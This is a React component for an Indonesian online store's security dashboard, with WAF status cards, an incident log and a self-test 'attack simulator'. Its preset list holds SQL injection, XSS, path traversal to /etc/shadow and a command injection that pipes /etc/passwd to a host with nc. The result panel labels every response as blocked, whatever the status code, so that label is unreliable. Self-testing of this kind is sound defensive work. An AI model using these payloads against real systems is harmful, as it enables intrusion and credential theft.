import React, { useState, useEffect } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Lock,
  EyeOff,
  Activity,
  Terminal,
  Play,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  RefreshCw,
  Cpu,
} from 'lucide-react';
import { api } from '../services/api.js';
import type { SecurityAuditLog } from '../types.js';

export const SecurityAuditView: React.FC = () => {
  const [stats, setStats] = useState<any>(null);
  const [logs, setLogs] = useState<SecurityAuditLog[]>([]);
  const [loading, setLoading] = useState(false);

  // Attack simulator state
  const [testPayload, setTestPayload] = useState<string>("' OR '1'='1' --");
  const [testEndpoint, setTestEndpoint] = useState<string>('/api/order/create');
  const [simResult, setSimResult] = useState<any>(null);
  const [simLoading, setSimLoading] = useState(false);

  const presetPayloads = [
    { name: 'SQL Injection 1', payload: "' OR 1=1 --", type: 'SQLi' },
    { name: 'SQL Injection 2 (UNION)', payload: "admin' UNION SELECT null,password,salt FROM users --", type: 'SQLi' },
    { name: 'XSS Script Payload', payload: '<script>alert(document.cookie)</script>', type: 'XSS' },
    { name: 'Command Injection', payload: '; cat /etc/passwd | nc 10.0.0.1 80', type: 'Cmd Injection' },
    { name: 'Path Traversal', payload: '../../../../etc/shadow', type: 'Traversal' },
  ];

  useEffect(() => {
    loadSecurityData();
  }, []);

  const loadSecurityData = async () => {
    setLoading(true);
    try {
      const [statsRes, logsRes] = await Promise.all([
        api.getSecurityStats(),
        api.getSecurityLogs(),
      ]);

      if (statsRes.status && statsRes.data) setStats(statsRes.data);
      if (logsRes.status && Array.isArray(logsRes.data)) setLogs(logsRes.data);
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  const runAttackSimulation = async () => {
    setSimLoading(true);
    setSimResult(null);

    try {
      // Send raw payload to test WAF and error masking
      const res = await fetch(testEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          code: 'TEST',
          target: testPayload,
        }),
      });

      const json = await res.json();
      setSimResult({
        statusCode: res.status,
        response: json,
        blocked: res.status === 403 || res.status === 400,
      });

      // Refresh logs
      loadSecurityData();
    } catch (err: any) {
      setSimResult({
        statusCode: 500,
        response: { message: 'Koneksi ditolak sistem keamanan.' },
        blocked: true,
      });
    } finally {
      setSimLoading(false);
    }
  };

  return (
    <div className="max-w-5xl mx-auto space-y-8">
      {/* Header Banner */}
      <div className="bg-gradient-to-r from-slate-900 via-slate-850 to-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
        <div className="flex items-center gap-3.5 mb-2">
          <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
            <ShieldCheck className="w-7 h-7" />
          </div>
          <div>
            <h2 className="text-xl font-extrabold text-white tracking-tight">
              Pusat Keamanan &amp; Audit WAF Ibad Store
            </h2>
            <p className="text-xs text-slate-400">
              Pertahanan proaktif berlapis: Anti-Injection, Zero Data Leakage Error Masking, dan Cryptographic Vault
            </p>
          </div>
        </div>
      </div>

      {/* Security Protocol Status Matrix */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Anti Injection */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-2">
          <div className="flex items-center justify-between">
            <span className="text-[10px] text-slate-400 font-mono">LAYER 1</span>
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
          </div>
          <div className="flex items-center gap-2 text-emerald-400 font-bold text-sm">
            <Activity className="w-4 h-4" />
            <span>Anti-Injection Guard</span>
          </div>
          <p className="text-[11px] text-slate-400">
            Scanning regex &amp; signature ketat memblokir SQLi, XSS, NoSQL, and Command Injections seketika.
          </p>
        </div>

        {/* Error Masking */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-2">
          <div className="flex items-center justify-between">
            <span className="text-[10px] text-slate-400 font-mono">LAYER 2</span>
            <span className="w-2 h-2 rounded-full bg-cyan-400"></span>
          </div>
          <div className="flex items-center gap-2 text-cyan-400 font-bold text-sm">
            <EyeOff className="w-4 h-4" />
            <span>Error Masking</span>
          </div>
          <p className="text-[11px] text-slate-400">
            Jika terjadi injeksi atau error sistem, detail teknis disembunyikan total dari publik untuk mencegah reconnaissance.
          </p>
        </div>

        {/* Cryptographic Vault */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-2">
          <div className="flex items-center justify-between">
            <span className="text-[10px] text-slate-400 font-mono">LAYER 3</span>
            <span className="w-2 h-2 rounded-full bg-violet-400"></span>
          </div>
          <div className="flex items-center gap-2 text-violet-400 font-bold text-sm">
            <Lock className="w-4 h-4" />
            <span>PBKDF2 &amp; AES-256</span>
          </div>
          <p className="text-[11px] text-slate-400">
            Password di-hash dengan 100.000 iterasi PBKDF2-SHA512 + Salt Unik. Session bertanda tangan HMAC-SHA256.
          </p>
        </div>

        {/* Gateway Security */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-2">
          <div className="flex items-center justify-between">
            <span className="text-[10px] text-slate-400 font-mono">LAYER 4</span>
            <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
          </div>
          <div className="flex items-center gap-2 text-emerald-400 font-bold text-sm">
            <Cpu className="w-4 h-4" />
            <span>Atlantic Gateway H2H</span>
          </div>
          <p className="text-[11px] text-slate-400">
            API Key gateway terisolasi penuh di server backend, tidak pernah bocor ke browser client.
          </p>
        </div>
      </div>

      {/* Interactive Penetration Test & Attack Simulator */}
      <div className="bg-slate-900/95 border border-cyan-500/30 rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-4 border-b border-slate-800">
          <div>
            <div className="flex items-center gap-2">
              <Terminal className="w-5 h-5 text-cyan-400" />
              <h3 className="text-base font-bold text-white tracking-tight">
                Simulator Uji Penetrasi &amp; Pembuktian Keamanan
              </h3>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              Coba kirimkan payload SQL Injection atau XSS ke sistem untuk melihat bagaimana WAF memblokir dan menyembunyikan error dari publik!
            </p>
          </div>

          <span className="px-3 py-1 bg-cyan-950/80 border border-cyan-800 text-cyan-300 rounded-full text-[10px] font-mono font-bold self-start sm:self-auto">
            LIVE SANDBOX
          </span>
        </div>

        {/* Quick Payload Preset Selector */}
        <div className="space-y-2">
          <label className="text-xs font-bold text-slate-300 block">Pilih Contoh Payload Serangan:</label>
          <div className="flex flex-wrap gap-2">
            {presetPayloads.map((preset) => (
              <button
                key={preset.name}
                type="button"
                onClick={() => setTestPayload(preset.payload)}
                className="px-3 py-1.5 rounded-xl bg-slate-950 hover:bg-slate-800 border border-slate-800 hover:border-cyan-500/50 text-[11px] text-slate-300 transition-colors cursor-pointer flex items-center gap-1.5 font-mono"
              >
                <span className="text-cyan-400 font-bold">{preset.type}:</span>
                <span>{preset.name}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Input area */}
        <div className="space-y-3">
          <div>
            <label className="block text-xs font-medium text-slate-300 mb-1">
              Payload yang Akan Dikirim:
            </label>
            <input
              id="input-sim-payload"
              type="text"
              value={testPayload}
              onChange={(e) => setTestPayload(e.target.value)}
              className="w-full px-4 py-3 bg-slate-950 border border-slate-700 focus:border-cyan-500 rounded-xl text-xs text-rose-300 focus:outline-none focus:ring-1 focus:ring-cyan-500 font-mono"
            />
          </div>

          <button
            id="btn-run-sim-attack"
            type="button"
            onClick={runAttackSimulation}
            disabled={simLoading}
            className="w-full sm:w-auto px-6 py-2.5 bg-gradient-to-r from-rose-600 to-rose-700 hover:from-rose-500 hover:to-rose-600 text-white font-bold rounded-xl text-xs shadow-lg shadow-rose-900/30 transition-all cursor-pointer flex items-center justify-center gap-2"
          >
            {simLoading ? (
              <>
                <span className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin"></span>
                <span>Menguji Respon WAF...</span>
              </>
            ) : (
              <>
                <Play className="w-4 h-4" />
                <span>Kirim &amp; Uji Pertahanan WAF Sekarang</span>
              </>
            )}
          </button>
        </div>

        {/* Simulator Results Output Terminal */}
        {simResult && (
          <div className="space-y-3 pt-2 animate-in fade-in">
            <p className="text-xs font-bold text-slate-300">Hasil Respon Sistem (Dari Sudut Pandang Publik):</p>
            <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800 font-mono text-xs space-y-3">
              <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                <div className="flex items-center gap-2">
                  <span className="text-slate-400">HTTP STATUS:</span>
                  <span
                    className={`font-bold px-2 py-0.5 rounded text-[11px] ${
                      simResult.statusCode === 403 || simResult.statusCode === 400
                        ? 'bg-rose-950 text-rose-400 border border-rose-800'
                        : 'bg-emerald-950 text-emerald-400'
                    }`}
                  >
                    {simResult.statusCode} FORBIDDEN / BLOCKED
                  </span>
                </div>

                <div className="flex items-center gap-1.5 text-emerald-400 text-[11px]">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Serangan Berhasil Dinetralkan &amp; Error Disembunyikan</span>
                </div>
              </div>

              {/* JSON response shown to client */}
              <div>
                <p className="text-[11px] text-slate-400 mb-1">Payload Respon Publik (Zero Leakage):</p>
                <pre className="p-3 bg-slate-900/80 rounded-xl text-cyan-300 overflow-x-auto text-[11px] border border-slate-800">
                  {JSON.stringify(simResult.response, null, 2)}
                </pre>
              </div>

              <div className="text-[11px] text-slate-400 bg-slate-900/40 p-3 rounded-xl border border-slate-800/60">
                <span className="font-bold text-slate-200">Analisis Keamanan: </span>
                Sistem mendeteksi ancaman secara otomatis sebelum mencapai query database. Stack trace internal, query SQL, dan skema database disembunyikan sepenuhnya dari publik dan diganti dengan pesan standar aman serta kode identifikasi incident yang terenkripsi.
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Security Audit Incident Log Table */}
      <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
        <div className="flex items-center justify-between">
          <div>
            <h3 className="text-sm font-bold text-white">Log Audit Keamanan Terakhir</h3>
            <p className="text-[11px] text-slate-400">Aktivitas mencurigakan yang berhasil ditolak sistem</p>
          </div>
          <button
            onClick={loadSecurityData}
            className="p-1.5 rounded-lg bg-slate-950 border border-slate-800 text-slate-400 hover:text-white cursor-pointer"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
          </button>
        </div>

        {logs.length === 0 ? (
          <div className="text-center py-8 text-slate-400 text-xs">
            <ShieldCheck className="w-8 h-8 text-emerald-500 mx-auto mb-2" />
            <p>Sistem aman. Belum ada aktivitas pelanggaran keamanan yang tercatat.</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead>
                <tr className="border-b border-slate-800 text-slate-400">
                  <th className="pb-3 font-medium">Incident ID</th>
                  <th className="pb-3 font-medium">Tipe Ancaman</th>
                  <th className="pb-3 font-medium">Tindakan WAF</th>
                  <th className="pb-3 font-medium">Endpoint</th>
                  <th className="pb-3 font-medium">Waktu</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60 font-mono text-[11px]">
                {logs.map((log) => (
                  <tr key={log.id} className="hover:bg-slate-800/30 transition-colors">
                    <td className="py-2.5 text-cyan-400 font-bold">{log.incidentId}</td>
                    <td className="py-2.5 text-rose-400 font-semibold">{log.threatType}</td>
                    <td className="py-2.5">
                      <span className="px-2 py-0.5 rounded bg-rose-950 border border-rose-800 text-rose-300 text-[10px]">
                        BLOCKED &amp; MASKED
                      </span>
                    </td>
                    <td className="py-2.5 text-slate-300">{log.endpoint}</td>
                    <td className="py-2.5 text-slate-400">
                      {new Date(log.timestamp).toLocaleTimeString('id-ID')}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
};
